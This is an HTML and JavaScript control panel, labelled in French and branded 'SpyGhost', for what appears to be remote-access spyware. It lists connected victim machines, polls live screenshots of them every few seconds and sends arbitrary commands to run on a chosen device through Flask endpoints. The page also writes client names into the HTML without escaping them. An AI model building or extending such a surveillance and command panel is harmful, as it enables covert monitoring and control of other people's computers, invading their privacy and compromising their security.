<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>Surveillance PC</title>
    <style>
body { font-family: sans-serif; margin: 0; padding: 0; background-color: #e1efff; }
.navbar { background-color: #a8d2fc; color: white; padding: 10px 20px; display: flex; justify-content: space-between; align-items: center; border-radius: 7px; margin: 5px;}
.navbar input[type="text"] { padding: 8px; margin-right: 10px; border-radius: 5px; width: 65%; border: none; outline: none;}
.navbar button { padding: 8px 22px; border: none; border-radius: 5px; background-color: #00b3ad; color: white; cursor: pointer;}

.client-list { display: flex; flex-wrap: wrap; padding: 20px; }
.client-block { background-color: rgba(255, 255, 255, 0.4) ; border-radius: 8px; margin: 10px; padding: 15px; width: 300px; box-shadow: 0 2px 4px #8BA9CC80 ; cursor: pointer; }
.client-block h3 { margin-top: 0; margin-bottom: 5px; margin-left: 10px; }
.client-block button { padding: 8px 22px; border: none; border-radius: 5px; background-color: #0086b3; color: white; cursor: pointer;}

.device-page {background-color:  #edf5ff; padding: 20px; }
.device-page button { padding: 8px 22px; border: none; border-radius: 5px; background-color: #7d8ceb; color: white; cursor: pointer; margin-left: 10px;}
.device-page input { padding: 8px; border-radius: 5px; border-width: 1px; width: 65%; margin: 10px; outline: none;}
.device-page h2, h3 { margin: 10px; }

.screenshot-area img { max-width: 70%; border: 1px solid #ccc; border-radius: 5px; margin-left: 10px; box-shadow: 0 2px 4px #8BA9CC80}
.command-area textarea { width: 100%; height: 100px; margin-bottom: 10px; outline: none;}
</style>
</head>

<body>
    <div class="navbar">
        <img src="SpyGhost_icon.png" alt="SpyGhost official icon" width="41.6" height="41.6"/>
        <input type="text" placeholder="Rechercher un appareil...">
        <div class="client-count"> En ligne : <span id="connected-count">0</span> / Hors ligne : <span id="disconnected-count">0</span></div>
        <button id="api-button">API</button>
        <button id="settings-button">Settings</button>
    </div>

    <div class="client-list" id="client-list">
        </div>

    <div class="device-page" id="device-page" style="display: none;">
        <h2> Surveillance de l'appareil <span id="device-name-header"></span></h2>
        <div class="screenshot-area">
            <h3>Screenshot en direct</h3>
            <img id="screenshot-display" src="" alt="Screenshot de l'appareil">
        </div>
        <div class="command-area">
            <h3>Exécuter une commande</h3>
            <input type="text" id="command-input" placeholder="Taper une commande">
            <button id="execute-command-button"> Exécuter </button>
            <div id="command-output"></div>
        </div>
        <button id="back-to-list-button"> Retour à la liste des appareils </button>
    </div>

    <script >document.addEventListener('DOMContentLoaded', function() {
        const clientListDiv = document.getElementById('client-list');
        const devicePageDiv = document.getElementById('device-page');
        const backToListButton = document.getElementById('back-to-list-button');
        const screenshotDisplay = document.getElementById('screenshot-display');
        const deviceNameHeader = document.getElementById('device-name-header');
        const commandInput = document.getElementById('command-input');
        const executeCommandButton = document.getElementById('execute-command-button');
        const commandOutputDiv = document.getElementById('command-output');
        const connectedCountSpan = document.getElementById('connected-count');
        const disconnectedCountSpan = document.getElementById('disconnected-count');
    
        let currentClientId = null; // Pour suivre l'appareil actuellement affiché dans la page dédiée
    
        function fetchClients() {
            fetch('/clients') // Endpoint API Flask pour récupérer la liste des clients
                .then(response => response.json())
                .then(clients => {
                    clientListDiv.innerHTML = ''; // Effacer la liste actuelle
                    let connectedClients = 0;
                    let disconnectedClients = 0;
    
                    clients.forEach(client => {
                        const clientBlock = document.createElement('div');
                        clientBlock.className = 'client-block';
                        clientBlock.innerHTML = `
                            <h3>${client.name}</h3>
                            <p>OS: ${client.os_type}</p>
                            <p>Connecté: ${client.is_connected ? 'Oui' : 'Non'}</p>
                            <button onclick="showDevicePage(${client.id}, '${client.name}')">Surveiller</button>
                            <button onclick="disconnectClient(${client.id})">Déconnecter</button> 
                        `;
                        clientListDiv.appendChild(clientBlock);
                        if (client.is_connected) {
                            connectedClients++;
                        } else {
                            disconnectedClients++;
                        }
                    });
                    connectedCountSpan.textContent = connectedClients;
                    disconnectedCountSpan.textContent = disconnectedClients;
                });
        }
    
        window.showDevicePage = function(clientId, clientName) { // Fonction globale pour être appelée depuis HTML
            currentClientId = clientId;
            deviceNameHeader.textContent = clientName;
            devicePageDiv.style.display = 'block';
            clientListDiv.style.display = 'none';
            fetchScreenshot(clientId); // Charger le premier screenshot en arrivant sur la page
            startScreenshotPolling(clientId); // Démarrer le polling régulier des screenshots
        }

        window.disconnectClient = function(clientId) { // Fonction globale pour être appelée depuis HTML
    fetch(`/client/${clientId}/disconnect`, { // Endpoint API Flask pour déconnecter le client
        method: 'POST',
    })
    .then(response => response.json())
    .then(data => {
        console.log(data.message); // Afficher un message de confirmation dans la console (peut être amélioré)
        fetchClients(); // Rafraîchir la liste des clients pour mettre à jour l'état de connexion
    });
}
    
        backToListButton.addEventListener('click', function() {
            devicePageDiv.style.display = 'none';
            clientListDiv.style.display = 'flex';
            stopScreenshotPolling(); // Arrêter le polling quand on quitte la page de l'appareil
        });
    
        let screenshotPollingInterval; // Variable pour stocker l'intervalle du polling des screenshots
    
        function fetchScreenshot(clientId) {
            screenshotDisplay.src = `/screenshots/client_${clientId}_latest.png?timestamp=${new Date().getTime()}`; // Ajout d'un timestamp pour forcer le navigateur à recharger l'image
        }
    
    
        function startScreenshotPolling(clientId) {
            screenshotPollingInterval = setInterval(() => {
                fetchScreenshot(clientId);
            }, 5000); // Rafraîchir le screenshot toutes les 5 secondes (ajustez ce délai)
        }
    
        function stopScreenshotPolling() {
            clearInterval(screenshotPollingInterval);
        }
    
    
        executeCommandButton.addEventListener('click', function() {
            const command = commandInput.value;
            if (command && currentClientId) {
                fetch(`/client/${currentClientId}/command`, {  // Endpoint API Flask pour exécuter une commande
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({ command: command })
                })
                .then(response => response.json())
                .then(data => {
                    commandOutputDiv.textContent = data.message; // Afficher la réponse du serveur
                    commandInput.value = ''; // Vider l'input de commande
                });
            } else {
                commandOutputDiv.textContent = 'Veuillez entrer une commande et sélectionner un appareil.';
            }
        });
    
    
        // Rafraîchir la liste des clients toutes les 10 secondes (ou moins souvent)
        setInterval(fetchClients, 10000); // Rafraîchir la liste toutes les 10 secondes
        fetchClients(); // Charger la liste initiale au démarrage de la page
    });</script>
</body>
</html>